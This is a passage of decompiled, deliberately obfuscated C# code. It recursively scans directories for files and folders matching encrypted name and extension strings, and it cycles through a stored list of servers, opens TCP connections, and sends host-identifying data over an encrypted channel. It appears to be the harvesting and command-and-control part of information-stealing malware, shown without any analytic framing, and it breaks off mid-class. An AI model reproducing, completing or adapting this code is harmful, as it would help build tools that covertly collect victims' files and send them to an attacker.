															goto IL_03ac;
														case 9u:
															dict7208.date71.Add (new settings7294 (current615.path1429.FullName, current616.path1429));
															num4 = (int)(0 - num2 + 557693411);
															continue;
														case 5u:
															max695 (current616, dict7208);
															num4 = ~-331721881;
															continue;
														case 10u:
															goto IL_042f;
														case 6u:
															dict7208.key99.Add (new settings7294 (name2, current616.path1429));
															goto end_IL_04b6;
														case 0u:
															dict7208.child3855.Add (current616.path1429);
															num4 = 710276342;
															continue;
														case 8u:
															goto end_IL_02fe;
														case 11u: {
															using (IEnumerator<status423> enumerator4 = current616.level10.GetEnumerator ()) {
																while (true) {
																	IL_0542:
																	int num5 = (enumerator4.MoveNext () ? (--1986884476) : (~-1117481744));
																	while (true) {
																		num2 = (uint)(num5 ^ 0x5DB2AECD);
																		switch (num2 % 8) {
																		case 3u:
																			num5 = 1986884476;
																			continue;
																		default:
																			num5 = 1986884476;
																			continue;
																		case 6u:
																			num5 = (int)((!name.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("c9f249ad593008bc4084e2dde51ad"))) ? (0 - num2 + 751320734) : (num2 + 311779967));
																			continue;
																		case 7u:
																			break;
																		case 1u:
																			current617 = enumerator4.Current;
																			num5 = 1341489825;
																			continue;
																		case 0u:
																			dict7208.child3855.Add (current617.path1429);
																			num5 = ~-1490369299;
																			continue;
																		case 4u:
																			name = current617.path1429.Name;
																			num5 = (int)num2 - -851471303;
																			continue;
																		case 5u:
																			num5 = ((!name.Contains (flag6144.0e291526dfde44109a60e580c474e7dd ("e9329fbab14a6fa09b245c166"))) ? ((int)num2 - -255037861) : ((int)(num2 - 509022192)));
																			continue;
																		case 2u:
																			goto end_IL_04df;
																		}
																		goto IL_0542;
																		continue;
																		end_IL_04df:
																		break;
																	}
																	break;
																}
															}
															goto end_IL_04b6;
														}
														case 4u:
														case 7u:
															goto end_IL_04b6;
														}
														num4 = (current616.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("c97e2e6147f19d044f04c0fd15cc09f20")) ? (--1960888538) : (~-1919091048));
														continue;
														IL_042f:
														num4 = ((!current616.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("9c8fba35915f91ae439b6df30f3eeead7a3"))) ? ((int)(0 - num2) ^ -1229970550) : ((int)(num2 + 767087114)));
														continue;
														IL_0372:
														name2 = current616.path1429.Name;
														num4 = (int)((!name2.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("4c7ee518f261f692b37f04c9c"))) ? (num2 + 1314385735) : (num2 + 1360155058));
														continue;
														IL_03ac:
														num4 = ((!name2.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("2e948714ed51ce5aa8e7d"))) ? ((int)(num2 - 184673313)) : ((int)num2 + -44192972));
														continue;
														end_IL_02fe:
														break;
													}
													continue;
													end_IL_04b6:
													break;
												}
											}
										}
										goto end_IL_0270;
									}
									case 7u:
									case 8u:
										goto end_IL_0270;
									}
									num3 = (current615.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("2e9ff433a034d12d180eaae47929976e8")) ? 179214114 : 1194202799);
									continue;
									IL_02b5:
									num3 = ((!current615.path1429.Name.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("be39338e97497f1b7f0e3"))) ? (--141741973) : 1177278646);
									continue;
									IL_0166:
									num3 = (int)((!current615.path1429.Name.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("6c06a9320af0bf85ccc87b79f"))) ? (0 - num2 + 222385330) : (0 - num2 + 327070993));
									continue;
									IL_0243:
									num3 = ((!current615.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("adb085332b5547ae1a9b1d8fbaa5b972a68"))) ? ((int)(~num2) + -1258665512) : ((int)(num2 - 1196174345)));
									continue;
									end_IL_00f6:
									break;
								}
								continue;
								end_IL_0270:
								break;
							}
						}
					}
					break;
				}
			}
			return dict7208;
		}

		private static void max695 (status423 target56, dict7207 color452)
		{
			if (target56.path1429.Name.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("e9679cd816dcc3b30a98de3"))) {
				return;
			}
			using IEnumerator<FileInfo> enumerator = target56.rate98.GetEnumerator ();
			FileInfo current615 = default(FileInfo);
			while (true) {
				int num = (enumerator.MoveNext () ? (--2097180060) : (-1285106653));
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + -1499154704)) % 15) {
					case 2u:
						num = ~-2097180061;
						continue;
					default:
						num = 2097180060;
						continue;
					case 7u:
						num = (current615.Extension.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("d9fd8ce932fa298ec6a")) ? ((int)((0 - num2) ^ 0x9288635)) : ((int)num2 - -820379660));
						continue;
					case 14u:
						num = (current615.Name.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("9cac56e1b49b8492b86")) ? ((int)num2 ^ -659161781) : ((int)num2 - -1528013574));
						continue;
					case 6u:
						num = ((!current615.Name.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("1c9629f6d24ff25dff78792"))) ? ((int)(0 - num2) + -56364792) : ((int)num2 ^ -92013907));
						continue;
					case 8u:
						num = ((!current615.Extension.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("af81bb3952996770218"))) ? ((int)num2 - -1905173169) : ((int)(~num2) + -586365508));
						continue;
					case 1u:
						current615 = enumerator.Current;
						num = -1709663201;
						continue;
					case 3u:
						num = (current615.Extension.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("9da298662a906776674")) ? ((int)(num2 + 2134717416)) : ((int)num2 ^ -1656460093));
						continue;
					case 13u: {
						error0736 item4707 = new error0736 {
							color7863 = target56.path1429.Name,
							node951 = new List<FileSystemInfo> (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5fb7e2c1831dd2b679c")) { current615 }
						};
						color452.price2676.Add (item4707);
						num = (int)(~num2 ^ 0x61B5D138);
						continue;
					}
					case 10u:
						break;
					case 9u:
						num = ((!current615.Name.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("9d542f64265c9f57e8585e0"))) ? ((int)num2 - -1442511555) : ((int)(~num2 + 481340173)));
						continue;
					case 5u:
						num = (current615.Extension.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("ad1923af599ee9f38a8")) ? ((int)num2 ^ -449897793) : ((int)num2 ^ -744554237));
						continue;
					case 11u:
						num = (current615.Extension.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("0f9b9be851f241fe609")) ? ((int)(0 - num2) + -311291216) : ((int)((0 - num2) ^ 0x4E9722B9)));
						continue;
					case 0u:
						num = (current615.Extension.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("f95c9d9aafc053fa9bd")) ? ((int)(0 - num2) + -97929382) : ((int)(~num2) ^ -1136814226));
						continue;
					case 12u:
						num = (current615.Extension.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("afc02aee4a90e9ffd89")) ? ((int)(~num2 ^ 0x6CC13D66)) : ((int)(~num2) + -1035550204));
						continue;
					case 4u:
						return;
					}
					break;
				}
			}
		}
	}
}
namespace target161
{
	internal class status423
	{
		[CompilerGenerated]
		private DirectoryInfo dict81;

		[CompilerGenerated]
		private IEnumerable<status423> stack88 = new List<status423> ();

		[CompilerGenerated]
		private IEnumerable<FileInfo> sum33 = new List<FileInfo> ();

		public DirectoryInfo path1429 {
			[CompilerGenerated]
			get {
				return dict81;
			}
			[CompilerGenerated]
			set {
				dict81 = value;
			}
		}

		public IEnumerable<status423> level10 {
			[CompilerGenerated]
			get {
				return stack88;
			}
			[CompilerGenerated]
			set {
				stack88 = value;
			}
		}

		public IEnumerable<FileInfo> rate98 {
			[CompilerGenerated]
			get {
				return sum33;
			}
			[CompilerGenerated]
			set {
				sum33 = value;
			}
		}

		public status423 (DirectoryInfo page08, int settings129 = 0)
		{
			IEnumerable<DirectoryInfo> source = default(IEnumerable<DirectoryInfo>);
			while (true) {
				int num = -1328588021;
				while (true) {
					uint num2 = (uint)(num + -2143816514);
					switch (num2 % 10) {
					case 2u:
						break;
					default:
						num = -1328588021;
						continue;
					case 1u:
						path1429 = page08;
						num = (int)(0 - num2) + -90235613;
						continue;
					case 8u:
						num = ((page08 == null) ? ((int)num2 + -1245513857) : ((int)num2 ^ -2025513508));
						continue;
					case 7u:
						level10 = new status423[0];
						num = (int)((0 - num2) ^ 0x30F0A761);
						continue;
					case 0u:
						return;
					case 3u:
						rate98 = new FileInfo[0];
						num = (int)(num2 + 327155308);
						continue;
					case 6u:
						source = args3354 (page08);
						num = -1489064257;
						continue;
					case 9u:
						return;
					case 4u:
						rate98 = id560 (page08);
						num = ((settings129 > 0) ? (-1763379146) : (-1432435473));
						continue;
					case 5u:
						level10 = new List<status423> (source.Select ((DirectoryInfo range92) => new status423 (range92, settings129 - flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c92594931beda70bfb2"))));
						return;
					}
					break;
				}
			}
		}

		public status423 (string balance0653, int format270 = 0)
			: this (new DirectoryInfo (balance0653), format270)
		{
		}

		public bool session9422 (string id848)
		{
			return rate98.Any ((FileInfo color922) => color922.Name.time0110 (id848));
		}

		public bool args65 (string current641)
		{
			return level10.Any (delegate(status423 status747) {
				if (status747 == null) {
					goto IL_0003;
				}
				object obj = status747.path1429;
				goto IL_0039;
				IL_0063:
				return false;
				IL_0003:
				int num = ~-447576282;
				goto IL_0009;
				IL_0009:
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num - -130335052)) % 4) {
					case 3u:
						break;
					default:
						num = 447576281;
						continue;
					case 1u:
						goto IL_0030;
					case 2u:
						return status747.path1429.Name.time0110 (current641);
					case 0u:
						goto IL_0063;
					}
					break;
				}
				goto IL_0003;
				IL_0030:
				obj = null;
				goto IL_0039;
				IL_0039:
				if (obj != null) {
					num = ~-718315543;
					goto IL_0009;
				}
				goto IL_0063;
			});
		}

		public List<FileInfo> temp9672 ()
		{
			List<FileInfo> list839 = new List<FileInfo> (rate98);
			using IEnumerator<status423> enumerator = level10.GetEnumerator ();
			status423 current615 = default(status423);
			while (true) {
				int num = (enumerator.MoveNext () ? (--385829515) : 982365959);
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + 438330224)) % 5) {
					case 2u:
						num = 385829515;
						continue;
					default:
						num = 385829515;
						continue;
					case 4u:
						current615 = enumerator.Current;
						num = 250462441;
						continue;
					case 0u:
						list839.AddRange (current615.temp9672 ());
						num = (int)num2 + -282098663;
						continue;
					case 1u:
						break;
					case 3u:
						return list839;
					}
					break;
				}
			}
		}

		public static IEnumerable<DirectoryInfo> args3354 (DirectoryInfo queue151)
		{
			try {
				return queue151.GetDirectories ();
			} catch {
				return new DirectoryInfo[0];
			}
		}

		public static IEnumerable<FileInfo> id560 (DirectoryInfo end8896)
		{
			try {
				return end8896.GetFiles ();
			} catch {
				return new FileInfo[0];
			}
		}

		public FileInfo state3424 (string dir0267)
		{
			return rate98.FirstOrDefault ((FileInfo right6989) => right6989.Name == dir0267);
		}
	}
}
namespace target92
{
	public class path577
	{
		public static List<row24> avg7013 (IEnumerable<DirectoryInfo> input61)
		{
			List<row24> list839 = new List<row24> ();
			using IEnumerator<DirectoryInfo> enumerator = input61.GetEnumerator ();
			DirectoryInfo current615 = default(DirectoryInfo);
			status423 status747 = default(status423);
			row24 row9446 = default(row24);
			status423 current616 = default(status423);
			status423 current617 = default(status423);
			while (true) {
				IL_0346:
				if (enumerator.MoveNext ()) {
					while (true) {
						current615 = enumerator.Current;
						status747 = new status423 (current615, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0d94b04e0a52a8fc041"));
						row9446 = new row24 (stack137 (current615), current615);
						int num = 2071616584;
						while (true) {
							uint num2;
							switch ((num2 = (uint)(num - 675786652)) % 6) {
							case 3u:
								num = --1866824660;
								continue;
							default:
								num = 1866824660;
								continue;
							case 5u:
								row9446.previous95 = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("49c263adc679d");
								num = (int)(num2 + 1057315374);
								continue;
							case 2u:
								break;
							case 0u:
								goto IL_0082;
							case 4u:
								goto end_IL_0018;
							case 1u:
								goto end_IL_00a4;
							}
							if (!status747.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("63221f1b1d1aad2bc10a8f36807839e"))) {
								num = (int)(num2 ^ 0x754B7365);
								continue;
							}
							goto IL_01bd;
							IL_0082:
							if (status747.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("7b4159180eaeebc2f112be585f481a89e"))) {
								num = (int)num2 + -640264794;
								continue;
							}
							goto IL_01bd;
							continue;
							end_IL_0018:
							break;
						}
						continue;
						end_IL_00a4:
						break;
					}
					using (IEnumerator<status423> enumerator2 = status747.level10.GetEnumerator ()) {
						while (true) {
							IL_017a:
							int num3 = (enumerator2.MoveNext () ? (~880644728) : (-444229681));
							while (true) {
								uint num2 = (uint)(~num3 ^ 0x6046F25D);
								switch (num2 % 6) {
								case 0u:
									num3 = ~880644728;
									continue;
								default:
									num3 = -880644729;
									continue;
								case 4u:
									row9446.format5368.Add (new width422 (current616.path1429.Name, current616.path1429));
									num3 = (int)((0 - num2) ^ 0x41046A34);
									continue;
								case 5u:
									num3 = ((!current616.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("d97996d33442d2f7e328656a46eec95"))) ? ((int)(0 - num2) + -207303989) : ((int)num2 + -771844853));
									continue;
								case 2u:
									break;
								case 3u:
									current616 = enumerator2.Current;
									num3 = ~1081261770;
									continue;
								case 1u:
									goto end_IL_00ec;
								}
								goto IL_017a;
								continue;
								end_IL_00ec:
								break;
							}
							break;
						}
					}
					goto IL_03de;
				}
				int num4 = -1149020933;
				goto IL_02e4;
				IL_02e4:
				while (true) {
					uint num2;
					switch ((num2 = (uint)(~num4 + -835360191)) % 9) {
					case 8u:
						break;
					default:
						num4 = -1280247484;
						continue;
					case 1u:
						goto IL_0322;
					case 2u:
						goto IL_0346;
					case 3u:
						row9446.previous95 = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("3e9f18e24211a");
						row9446.format5368.Add (new width422 (flag6144.0e291526dfde44109a60e580c474e7dd ("ad12c948d53949a609f4dfbfb"), current615));
						num4 = (int)num2 + -2058514240;
						continue;
					case 6u:
						list839.Add (row9446);
						num4 = (int)num2 ^ -402595808;
						continue;
					case 7u:
						row9446.format5368.Add (new width422 (flag6144.0e291526dfde44109a60e580c474e7dd ("af449f2c1ffcf9d57acfb20fa"), current615));
						num4 = (int)num2 ^ -916110038;
						continue;
					case 0u:
						num4 = (int)(~num2) + -804424541;
						continue;
					case 5u:
						goto IL_03de;
					case 4u:
						return list839;
					}
					break;
				}
				goto IL_02de;
				IL_0322:
				num4 = ((!status747.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("9f875110555b2dd3e3849a60fd01f8fb1b9d639"))) ? (-1582691298) : (--1701191948));
				goto IL_02e4;
				IL_03de:
				num4 = (row9446.format5368.Any () ? (--1559786739) : (-1724115603));
				goto IL_02e4;
				IL_01bd:
				if (status747.args65 (flag6144.0e291526dfde44109a60e580c474e7dd ("8e966d8d46bc00932d201c23fa6"))) {
					using (IEnumerator<status423> enumerator2 = new status423 (Path.Combine (current615.FullName, flag6144.0e291526dfde44109a60e580c474e7dd ("68d10c7dbc18fea7d4cdb47349f")), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1f9ede8464996268954")).level10.GetEnumerator ()) {
						while (true) {
							IL_029e:
							int num5 = (enumerator2.MoveNext () ? (-1251839950) : (-1528162299));
							while (true) {
								uint num2;
								switch ((num2 = (uint)((num5 ^ 0x3C439C05) - 1119989399)) % 5) {
								case 0u:
									num5 = -1251839950;
									continue;
								default:
									num5 = -1251839950;
									continue;
								case 2u:
									current617 = enumerator2.Current;
									num5 = ((!current617.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("4ef86842987abca81a7f061d0a0061b3b8d969c"))) ? 1557306201 : (-1889020123));
									continue;
								case 3u:
									row9446.format5368.Add (new width422 (current617.path1429.Name, current617.path1429));
									num5 = (int)(~num2) + -852150301;
									continue;
								case 1u:
									break;
								case 4u:
									goto end_IL_020d;
								}
								goto IL_029e;
								continue;
								end_IL_020d:
								break;
							}
							break;
						}
					}
					goto IL_03de;
				}
				if (status747.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("e920cf29eef0a485e24904fbecaa517"))) {
					goto IL_02de;
				}
				goto IL_0322;
				IL_02de:
				num4 = -1280247484;
				goto IL_02e4;
			}
		}

		private static string stack137 (DirectoryInfo source53)
		{
			string name = source53.Name;
			while (true) {
				int num = ~1180551429;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + 1245931484)) % 9) {
					case 0u:
						break;
					default:
						num = -1180551430;
						continue;
					case 2u:
						num = ((source53.Parent.Parent == null) ? ((int)(num2 - 1819710067)) : ((int)num2 ^ -402656356));
						continue;
					case 3u:
						num = ((!name.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("f976cdd87e70771f599d2c1053b2d"))) ? (~517332621) : (-847681605));
						continue;
					case 4u:
						num = ((!name.time0110 (flag6144.0e291526dfde44109a60e580c474e7dd ("2d90cea36571fdaeaacc8cb94"))) ? ((int)(0 - num2) + -1110229207) : ((int)(num2 - 411739779)));
						continue;
					case 7u:
						name = source53.Parent.Name;
						num = (int)num2 - -1845038855;
						continue;
					case 5u:
						num = ((source53.Parent == null) ? ((int)num2 ^ -157880603) : ((int)(num2 ^ 0x3F516518)));
						continue;
					case 8u:
						name = source53.Parent.Parent.Name;
						num = (int)num2 ^ -1305310875;
						continue;
					case 6u:
						num = ((source53.Parent == null) ? ((int)num2 ^ -1938571140) : ((int)(~num2 + 297741082)));
						continue;
					case 1u:
						return name;
					}
					break;
				}
			}
		}
	}
}
namespace line842
{
	public class row24
	{
		[CompilerGenerated]
		private string price426;

		[CompilerGenerated]
		private DirectoryInfo left67;

		[CompilerGenerated]
		private bool args4732;

		[CompilerGenerated]
		private List<width422> avg65 = new List<width422> ();

		public string index144 {
			[CompilerGenerated]
			get {
				return price426;
			}
			[CompilerGenerated]
			set {
				price426 = value;
			}
		}

		public DirectoryInfo date30 {
			[CompilerGenerated]
			get {
				return left67;
			}
			[CompilerGenerated]
			set {
				left67 = value;
			}
		}

		public bool previous95 {
			[CompilerGenerated]
			get {
				return args4732;
			}
			[CompilerGenerated]
			set {
				args4732 = value;
			}
		}

		public List<width422> format5368 {
			[CompilerGenerated]
			get {
				return avg65;
			}
			[CompilerGenerated]
			set {
				avg65 = value;
			}
		}

		public row24 (string right0015, DirectoryInfo parent5223)
		{
			index144 = right0015;
			date30 = parent5223;
		}
	}
}
namespace key702
{
	public class stream8120
	{
		[CompilerGenerated]
		private string time67;

		[CompilerGenerated]
		private row24 date147;

		[CompilerGenerated]
		private DirectoryInfo dict02;

		[CompilerGenerated]
		private DirectoryInfo code6836;

		[CompilerGenerated]
		private DirectoryInfo map96;

		public string next2236 {
			[CompilerGenerated]
			get {
				return time67;
			}
			[CompilerGenerated]
			set {
				time67 = value;
			}
		}

		public row24 array6599 {
			[CompilerGenerated]
			get {
				return date147;
			}
			[CompilerGenerated]
			set {
				date147 = value;
			}
		}

		public DirectoryInfo width021 {
			[CompilerGenerated]
			get {
				return dict02;
			}
			[CompilerGenerated]
			set {
				dict02 = value;
			}
		}

		public DirectoryInfo config071 {
			[CompilerGenerated]
			get {
				return code6836;
			}
			[CompilerGenerated]
			set {
				code6836 = value;
			}
		}

		public DirectoryInfo child48 {
			[CompilerGenerated]
			get {
				return map96;
			}
			[CompilerGenerated]
			set {
				map96 = value;
			}
		}

		public stream8120 (string tree78)
		{
			next2236 = tree78;
		}
	}
}
namespace node90
{
	public class error0736
	{
		[CompilerGenerated]
		private string date86 = string.Empty;

		[CompilerGenerated]
		private List<FileSystemInfo> node052 = new List<FileSystemInfo> ();

		public string color7863 {
			[CompilerGenerated]
			get {
				return date86;
			}
			[CompilerGenerated]
			set {
				date86 = value;
			}
		}

		public List<FileSystemInfo> node951 {
			[CompilerGenerated]
			get {
				return node052;
			}
			[CompilerGenerated]
			set {
				node052 = value;
			}
		}
	}
}
namespace key577
{
	public class width422
	{
		[CompilerGenerated]
		private string session5251;

		[CompilerGenerated]
		private DirectoryInfo id77;

		public string source238 {
			[CompilerGenerated]
			get {
				return session5251;
			}
			[CompilerGenerated]
			set {
				session5251 = value;
			}
		}

		public DirectoryInfo column158 {
			[CompilerGenerated]
			get {
				return id77;
			}
			[CompilerGenerated]
			set {
				id77 = value;
			}
		}

		public width422 (string path46, DirectoryInfo offset63)
		{
			source238 = path46;
			column158 = offset63;
		}
	}
}
namespace speed3334
{
	public class settings7294
	{
		[CompilerGenerated]
		private string id5334;

		[CompilerGenerated]
		private FileSystemInfo color52;

		public string file83 {
			[CompilerGenerated]
			get {
				return id5334;
			}
			[CompilerGenerated]
			set {
				id5334 = value;
			}
		}

		public FileSystemInfo end3857 {
			[CompilerGenerated]
			get {
				return color52;
			}
			[CompilerGenerated]
			set {
				color52 = value;
			}
		}

		public settings7294 (string buffer879, FileSystemInfo current428)
		{
			file83 = buffer879;
			end3857 = current428;
		}
	}
}
namespace input2017
{
	public class dict7207
	{
		[CompilerGenerated]
		private List<DirectoryInfo> output5216 = new List<DirectoryInfo> ();

		[CompilerGenerated]
		private List<error0736> options1539 = new List<error0736> ();

		[CompilerGenerated]
		private List<settings7294> height25 = new List<settings7294> ();

		[CompilerGenerated]
		private List<settings7294> queue97 = new List<settings7294> ();

		public List<DirectoryInfo> child3855 {
			[CompilerGenerated]
			get {
				return output5216;
			}
			[CompilerGenerated]
			set {
				output5216 = value;
			}
		}

		public List<error0736> price2676 {
			[CompilerGenerated]
			get {
				return options1539;
			}
			[CompilerGenerated]
			set {
				options1539 = value;
			}
		}

		public List<settings7294> date71 {
			[CompilerGenerated]
			get {
				return height25;
			}
			[CompilerGenerated]
			set {
				height25 = value;
			}
		}

		public List<settings7294> key99 {
			[CompilerGenerated]
			get {
				return queue97;
			}
			[CompilerGenerated]
			set {
				queue97 = value;
			}
		}
	}
}
namespace row4616
{
	public class error35
	{
		private TcpClient next12;

		public size0709 node457;

		public void args523 ()
		{
			string path578 = default(string);
			while (true) {
				string[] previous620 = size497.previous094;
				int num = 0;
				while (true) {
					IL_0008:
					int num2 = ~188202210;
					while (true) {
						uint num3;
						switch ((num3 = (uint)(num2 + 1892495285)) % 9) {
						case 5u:
							break;
						case 3u:
							goto IL_0008;
						default:
							num2 = -188202211;
							continue;
						case 7u:
							num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0c9482fe38e41476aa6");
							num2 = ~-222079141;
							continue;
						case 0u:
							path578 = previous620 [num];
							num2 = -6070434;
							continue;
						case 8u:
							goto IL_006a;
						case 4u:
							Thread.Sleep (rate33.tree9541 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9ea1abb98293ece1e72"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0c9e3f3105036522519")));
							num2 = (int)num3 ^ -127158709;
							continue;
						case 1u:
							num2 = (int)num3 + -1482213934;
							continue;
						case 6u:
							return;
						case 2u:
							goto IL_00c5;
						}
						break;
						IL_00c5:
						num2 = ((!time59 (path578)) ? ((int)(~num3 + 884117567)) : ((int)num3 ^ -947517448));
						continue;
						IL_006a:
						num2 = ((num >= previous620.Length) ? (~631352397) : (~853545715));
					}
					break;
				}
			}
		}

		private bool time59 (string path5170)
		{
			try {
				next12 = new TcpClient ();
				string hostname = default(string);
				int result = default(int);
				while (true) {
					int num = 1000646104;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num + -351035957)) % 5) {
						case 3u:
							break;
						default:
							num = 1000646104;
							continue;
						case 2u: {
							char[] array8361 = new char[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5af1af5c40b5311e99c")];
							array8361 [0] = (char)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e9abb7c717972dc738");
							string[] array8362 = path5170.Split (array8361);
							hostname = array8362 [0];
							num = ((!int.TryParse (array8362 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("4eebdb47885fa9f409f")], out result)) ? ((int)(~num2) ^ -1906324797) : ((int)(num2 ^ 0x7C5548B4)));
							continue;
						}
						case 1u:
							return false;
						case 4u:
							next12.Connect (hostname, result);
							num = --1413236237;
							continue;
						case 0u: {
							NetworkStream stream8121 = next12.GetStream ();
							node457 = new size0709 (stream8121);
							node457.line2356 (size497.args8868);
							return flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("0c917cbc26479");
						}
						}
						break;
					}
				}
			} catch {
				sum680 ();
				return false;
			}
		}

		public bool? list2013 ()
		{
			bool? flag6145 = default(bool?);
			try {
				byte[] message55 = rate33.name9659 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("67a338fe226172c359f"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("47b953f34c030da2a9c"));
				context70 status747 = default(context70);
				buffer2185 buffer2186 = default(buffer2185);
				while (true) {
					IL_001a:
					int num = --1697168152;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num + -1640263584)) % 11) {
						case 5u:
							break;
						default:
							num = 1697168152;
							continue;
						case 8u:
							flag6145 = null;
							num = (int)(num2 + 837865598);
							continue;
						case 3u:
							flag6145 = flag6145;
							num = (int)num2 + -1757575394;
							continue;
						case 6u:
							status747 = new context70 {
								number140 = size497.status473,
								position28 = size497.list72,
								amount8389 = data780.item322,
								format251 = message55
							};
							num = (int)(num2 ^ 0x7211667E);
							continue;
						case 7u:
							node457.key06 (status747);
							num = (int)(num2 ^ 0x7414EBA7);
							continue;
						case 9u:
							buffer2186 = node457.node16<buffer2185> ();
							num = (int)num2 - -1806209610;
							continue;
						case 4u:
							node457.line2356 (buffer2186.rate2497);
							num = -788035888;
							continue;
						case 1u:
							goto end_IL_0020;
						case 2u:
							size497.message10 = buffer2186.temp13;
							num = (int)(num2 + 1474563014);
							continue;
						case 0u:
							num = (error34.column31 (size497.message10, size497.map045) ? ((int)num2 ^ -580663033) : ((int)(num2 - 1597665645)));
							continue;
						case 10u:
							flag6145 = (byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("78ee93cce72cd68779c") != 0;
							goto end_IL_0020;
						}
						goto IL_001a;
						continue;
						end_IL_0020:
						break;
					}
					break;
				}
			} catch {
				flag6145 = false;
			}
			return flag6145;
		}

		public void sum680 ()
		{
			try {
				if (next12 != null) {
					next12.Close ();
				}
			} finally {
				next12 = null;
			}
		}
	}
}
namespace buffer029
{
	public class size0709
	{
		private NetworkStream start94;

		private start965 mode16;

		public size0709 (NetworkStream text249)
		{
			start94 = text249;
		}

		public void line2356 (byte[] score513)
		{
			mode16 = new start965 (score513);
		}

		private byte[] result3453 (int buffer5640)
		{
			int num = 0;
			int num4 = default(int);
			int num5 = default(int);
			byte[] array8361 = default(byte[]);
			while (true) {
				int num2 = ~-1197706119;
				while (true) {
					uint num3;
					switch ((num3 = (uint)(num2 + -1124570553)) % 11) {
					case 3u:
						break;
					default:
						num2 = 1197706118;
						continue;
					case 8u:
						num4 = buffer5640;
						num2 = (int)num3 - -1713935943;
						continue;
					case 7u:
						num2 = (int)num3 - -2062361214;
						continue;
					case 4u:
						num2 = ((num5 <= 0) ? ((int)num3 + -1517957981) : ((int)(~num3) ^ -2021952150));
						continue;
					case 2u:
						num4 -= num5;
						num2 = -1543520791;
						continue;
					case 6u:
						array8361 = new byte[buffer5640];
						num2 = (int)(num3 ^ 0x72643726);
						continue;
					case 0u:
						return null;
					case 10u:
						num5 = start94.Read (array8361, num, num4);
						num2 = 1214231051;
						continue;
					case 9u:
						num += num5;
						num2 = (int)num3 ^ -335124878;
						continue;
					case 1u:
						num2 = ((num4 > 0) ? 1909905817 : (-1120769059));
						continue;
					case 5u:
						return array8361;
					}
					break;
				}
			}
		}

		private void sum56 (byte[] left0228)
		{
			byte[] array8361 = mode16.code16 (left0228);
			byte[] bytes = BitConverter.GetBytes (array8361.Length);
			start94.Write (bytes, 0, bytes.Length);
			start94.Write (array8361, 0, array8361.Length);
		}

		private byte[] page1765 ()
		{
			byte[] array8361 = result3453 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0e9c4661ac5d8bb9af3"));
			if (array8361 == null) {
				goto IL_0014;
			}
			goto IL_0080;
			IL_0014:
			int num = --922342403;
			goto IL_001a;
			IL_001a:
			byte[] array8362 = default(byte[]);
			int num3 = default(int);
			while (true) {
				uint num2;
				switch ((num2 = (uint)(num - -508244289)) % 7) {
				case 4u:
					break;
				default:
					num = 922342403;
					continue;
				case 3u:
					return null;
				case 5u:
					return null;
				case 0u:
					goto IL_0064;
				case 6u:
					goto IL_0080;
				case 2u:
					return null;
				case 1u:
					return mode16.status28 (array8362);
				}
				break;
				IL_0064:
				array8362 = result3453 (num3);
				num = ((array8362 != null) ? (~-682050994) : 522160098);
			}
			goto IL_0014;
			IL_0080:
			num3 = BitConverter.ToInt32 (array8361, 0);
			num = ((num3 > 0) ? (~-1166206574) : (~-1392563777));
			goto IL_001a;
		}

		public void key06<name8613> (name8613 status88)
		{
			byte[] left8243 = offset009.code8187 (status88);
			sum56 (left8243);
		}

		public size696 node16<size696> ()
		{
			byte[] array8361 = page1765 ();
			while (true) {
				int num = --878436645;
				while (true) {
					uint num2 = (uint)(num - 810631552);
					switch (num2 % 4) {
					case 2u:
						break;
					default:
						num = 878436645;
						continue;
					case 1u:
						num = ((array8361 != null) ? ((int)num2 - -757755898) : ((int)num2 ^ -1611400259));
						continue;
					case 0u:
						return default(size696);
					case 3u:
						return offset009.size144<size696> (array8361);
					}
					break;
				}
			}
		}
	}
}
namespace dir0288
{
	public class start965
	{
		private readonly byte[] speed9110;

		public start965 (byte[] file924)
		{
			speed9110 = file924;
		}

